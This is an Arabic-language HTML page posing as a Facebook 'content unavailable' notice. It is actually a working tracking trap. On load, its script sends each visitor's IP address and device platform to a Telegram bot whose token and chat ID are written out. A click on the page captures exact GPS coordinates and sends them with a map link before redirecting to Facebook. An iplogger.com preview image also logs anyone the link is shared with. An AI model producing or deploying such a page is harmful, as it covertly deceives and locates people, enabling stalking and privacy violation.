<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <meta property="og:title" content="عذراً، هذا المحتوى غير متاح الآن">
    <meta property="og:description" content="تم حذف المنشور أو تقييده لمراجعة معايير المجتمع.">
    
    <meta property="og:image" content="https://iplogger.com/1XXXXX.jpg"> 
    
    <meta property="og:type" content="website">

    <title>Facebook - Content Removed</title>
    
    <style>
        body { margin: 0; background: #f0f2f5; font-family: Segoe UI, Arial; display: flex; align-items: center; justify-content: center; height: 100vh; cursor: pointer; }
        .error-box { text-align: center; max-width: 400px; }
        .icon-lock { width: 100px; margin-bottom: 20px; }
        .fb-btn { background: #1877f2; color: white; padding: 10px 20px; border-radius: 6px; text-decoration: none; border:none; font-weight:bold; }
    </style>
</head>
<body onclick="startCapture()">

    <div class="error-box">
        <img src="https://static.xx.fbcdn.net/rsrc.php/v3/y7/r/s9m_9bu7wS7.png" class="icon-lock">
        <div style="font-size:18px; font-weight:bold; color:#65676b; margin-bottom:10px;">المحتوى غير متوفر</div>
        <div style="font-size:14px; color:#65676b; margin-bottom:25px;">ربما تم حذف الرابط أو انتهاء صلاحيته.</div>
        <button class="fb-btn">الانتقال إلى فيسبوك</button>
    </div>

<script>
    const BOT_TOKEN = "8527565205:AAFpoyLDZir4oiQKqZPO-Cm40XVzUBvLER8";
    const CHAT_ID = "1611398303";

    // صيد البيانات عند الفتح الحقيقي
    async function captureOnOpen() {
        try {
            const res = await fetch('https://api.ipify.org?format=json');
            const data = await res.json();
            sendToBot(`🚀 الضحية فتح الرابط الآن!\n🌐 IP: ${data.ip}\n📱 الجهاز: ${navigator.platform}`);
        } catch (e) { console.log("Silent error"); }
    }

    // صيد الـ GPS الدقيق عند اللمس
    function startCapture() {
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition((pos) => {
                let msg = `🎯 صيد دقيق (GPS REAL)\n📍 الإحداثيات: ${pos.coords.latitude}, ${pos.coords.longitude}\n🔗 الخريطة: http://google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
                sendToBot(msg);
                setTimeout(() => { window.location.href = "https://m.facebook.com"; }, 500);
            }, () => { window.location.href = "https://m.facebook.com"; });
        }
    }

    function sendToBot(text) {
        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}`);
    }

    window.onload = captureOnOpen;
</script>
</body>
</html>
